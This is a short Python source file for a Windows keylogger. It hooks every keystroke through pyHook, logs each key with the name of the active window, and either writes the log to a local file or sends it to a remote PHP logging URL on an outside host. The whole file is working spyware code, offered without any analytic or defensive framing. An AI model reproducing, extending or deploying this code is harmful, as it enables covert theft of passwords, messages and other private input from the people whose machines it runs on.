import urllib
import pythoncom, pyHook, urllib2
from threading import Thread

###
user = "test"
server = False
url = "http://rootone.heliohost.org/php/log.php"
filename = "key.txt"
###

prev = ""
def key_event(event):
	global user
	global prev
	key = chr(event.Ascii) if event.Ascii != 0 else "" + event.Key + ""
	key = "Space" if key == " " else key
	key = "BackSP" if event.Ascii == 8 else key
	window = event.WindowName.split("\\")[-1]
	if prev != window:
		data = {"user": user, "key": key, "window": window}
	else:
		data = {"user": user, "key": key}
	txt = key + "\t\t\t\t\t" + window + "\n"
	if server:
		th = Thread(target=update_server, args=(data,))
	else:
		th = Thread(target=update_file, args=(txt,))
	th.start()
	th.exit()


def update_server(data):
	urllib2.urlopen(url + "?" + urllib.urlencode(data))


def update_file(data):
	with open(filename, "a") as f:
		f.write(data)
		f.close()


if __name__ == '__main__':
	if server:
		try:
			urllib2.urlopen(url + "?user=" + user)
		except:
			server = False
	key = pyHook.HookManager()
	key.KeyDown = key_event
	key.HookKeyboard()
	pythoncom.PumpMessages()
#hello this is a test!@#~this is a test$#~@$#	asd+#$&!